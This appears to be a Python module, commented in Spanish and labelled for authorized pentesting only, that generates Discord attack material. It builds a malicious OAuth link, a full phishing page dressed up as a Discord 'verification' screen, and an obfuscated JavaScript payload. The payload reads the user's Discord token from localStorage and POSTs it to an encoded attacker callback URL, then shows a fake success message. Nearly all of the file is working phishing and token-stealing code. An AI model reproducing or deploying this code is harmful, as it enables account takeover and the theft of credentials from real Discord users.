# payload_generator.py
# Genera payloads JS y enlaces para diferentes vectores
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import base64
import secrets
import json
import urllib.parse
from config import config

class PayloadGenerator:
    @staticmethod
    def generate_oauth_link(guild_id):
        scopes = config.OAUTH_SCOPES.replace(" ", "%20")
        return (
            f"https://discord.com/api/oauth2/authorize"
            f"?client_id={config.CLIENT_ID}"
            f"&permissions={config.OAUTH_PERMISSIONS}"
            f"&scope={scopes}"
            f"&redirect_uri={urllib.parse.quote(config.CALLBACK_URL)}"
            f"&response_type=code"
            f"&guild_id={guild_id}"
            f"&disable_guild_select=true"
        )

    @staticmethod
    def generate_html_phish_page(guild_id):
        oauth_url = PayloadGenerator.generate_oauth_link(guild_id)
        return f'''<!DOCTYPE html>
<html><head><title>Discord — Verificación</title>
<style>
body{{font-family:'Whitney','Helvetica Neue',sans-serif;background:#404eed;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}}
.card{{background:white;border-radius:8px;padding:32px;width:480px;box-shadow:0 8px 32px rgba(0,0,0,0.2);text-align:center;}}
h1{{font-size:24px;color:#060607;margin-bottom:8px;}}
p{{color:#4e5058;font-size:16px;margin-bottom:20px;}}
.btn{{background:#5865f2;color:white;border:none;border-radius:4px;padding:12px 40px;font-size:16px;cursor:pointer;text-decoration:none;display:inline-block;}}
.btn:hover{{background:#4752c4;}}
.footer{{margin-top:20px;font-size:13px;color:#949ba4;}}
</style></head>
<body><div class="card">
<svg class="logo" width="130" viewBox="0 0 24 24" fill="#5865F2"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.11 13.11 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
<h1>Verificación requerida</h1>
<p>Para acceder al servidor, debes autorizar la verificación</p>
<a class="btn" href="{oauth_url}">Autorizar verificación</a>
<div class="footer">Discord Verification System v3.2.1</div>
</div></body></html>'''

    @staticmethod
    def generate_js_payload():
        c2_b64 = base64.urlsafe_b64encode(config.CALLBACK_URL.encode()).decode()
        return f'''(async()=>{{const c=atob('{c2_b64}');let t=null;try{{const i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);t=i.contentWindow.localStorage.getItem('token');document.body.removeChild(i)}}catch(e){{}}if(!t){{for(let i=0;i<localStorage.length;i++){{const k=localStorage.key(i);const v=localStorage.getItem(k);if(v&&(v.startsWith('mfa.')||v.startsWith('MT'))){{t=v;break}}}}}}if(t){{await fetch(c+'/api/js_capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{token:t,ua:navigator.userAgent}})}});console.log('%c✅ Verificado!','color:green')}}else{{console.log('%c❌ Error','color:red')}}}})()'''

payload_generator = PayloadGenerator()
